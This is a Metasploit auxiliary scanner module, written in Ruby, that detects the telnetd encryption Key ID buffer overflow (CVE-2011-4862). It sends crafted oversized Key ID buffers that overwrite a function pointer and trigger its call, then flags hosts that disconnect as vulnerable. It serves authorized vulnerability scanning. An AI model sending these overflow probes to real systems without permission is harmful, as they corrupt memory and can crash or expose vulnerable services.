##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Telnet
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Telnet Service Encryption Key ID Overflow Detection',
      'Description' => 'Detect telnet services vulnerable to the encrypt option Key ID overflow (BSD-derived telnetd)',
      'Author'      => [ 'Jaime Penalba Estebanez <jpenalbae[at]gmail.com>', 'hdm' ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['BID', '51182'],
          ['CVE', '2011-4862'],
          ['EDB', '18280'],
          ['URL', 'https://blog.rapid7.com/2011/12/28/more-fun-with-bsd-derived-telnet-daemons']
        ]
    )
    register_options(
    [
      Opt::RPORT(23),
      OptInt.new('TIMEOUT', [true, 'Timeout for the Telnet probe', 30])
    ])
  end

  def to
    return 30 if datastore['TIMEOUT'].to_i.zero?
    datastore['TIMEOUT'].to_i
  end

  def run_host(ip)
    begin
      ::Timeout.timeout(to) do
        res = connect

        # This makes db_services look a lot nicer.
        banner_sanitized = Rex::Text.to_hex_ascii(banner.to_s)
        svc = report_service(:host => rhost, :port => rport, :name => "telnet", :info => banner_sanitized)

        # Check for encryption option ( IS(0) DES_CFB64(1) )
        sock.put("\xff\xfa\x26\x00\x01\x01\x12\x13\x14\x15\x16\x17\x18\x19\xff\xf0")

        loop do
          data = sock.get_once(-1, to) rescue nil
          if not data
            print_status("#{ip}:#{rport} Does not support encryption: #{banner_sanitized} #{data.to_s.unpack("H*")[0]}")
            return
          end
          break if data.index("\xff\xfa\x26\x02\x01")
        end

        buff_good = "\xff\xfa\x26" + "\x07" + "\x00" + ("X" * 63) + "\xff\xf0"
        buff_long = "\xff\xfa\x26" + "\x07" + "\x00" + ("X" * 64) + ( "\xcc" * 32) + "\xff\xf0"

        begin

          #
          # Send a long, but within boundary Key ID
          #
          sock.put(buff_good)
          data = sock.get_once(-1, 5) rescue nil
          unless data
            print_status("#{ip}:#{rport} UNKNOWN: No response to the initial probe: #{banner_sanitized}")
            return
          end

          unless data.index("\xff\xfa\x26\x08\xff\xf0")
            print_status("#{ip}:#{rport} UNKNOWN: Invalid reply to Key ID: #{data.unpack("H*")[0]} - #{banner_sanitized}")
            return
          end

          #
          # First round to overwrite the function pointer itself
          #
          sock.put(buff_long)
          data = sock.get_once(-1, 5)
          unless data
            print_status("#{ip}:#{rport} NOT VULNERABLE: No reply to first long Key ID: #{banner_sanitized}")
            return
          end

          unless data.index("\xff\xfa\x26\x08\xff\xf0")
            print_status("#{ip}:#{rport} UNKNOWN: Invalid reply to first Key ID: #{data.unpack("H*")[0]} - #{banner_sanitized}")
            return
          end

          #
          # Second round to force the function to be called
          #
          sock.put(buff_long)
          data = sock.get_once(-1, 5)
          unless data
            print_status("#{ip}:#{rport} NOT VULNERABLE: No reply to second long Key ID: #{banner_sanitized}")
            return
          end

          unless data.index("\xff\xfa\x26\x08\xff\xf0")
            print_status("#{ip}:#{rport} UNKNOWN: Invalid reply to second Key ID: #{data.unpack("H*")[0]} - #{banner_sanitized}")
            return
          end

          print_status("#{ip}:#{rport} NOT VULNERABLE: Service did not disconnect: #{banner_sanitized}")
          return

        rescue ::EOFError
        end

        # EOFError or response to 64-byte Key Id indicates vulnerable systems
        print_good("#{ip}:#{rport} VULNERABLE: #{banner_sanitized}")
        report_vuln(
          {
              :host	  => ip,
              :service  => svc,
              :name	  => self.name,
              :info	  => "Module #{self.fullname} confirmed acceptance of a long key ID: #{banner_sanitized}",
              :refs     => self.references
          }
        )

      end
    rescue ::Rex::ConnectionError, ::Errno::ECONNRESET => e
      print_error("A network issue has occurred: #{e.message}")
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    rescue Timeout::Error => e
      print_error("#{target_host}:#{rport} Timed out after #{to} seconds")
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    rescue ::Exception => e
      print_error("#{target_host}:#{rport} Error: #{e} #{e.backtrace}")
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    ensure
      disconnect
    end
  end
end
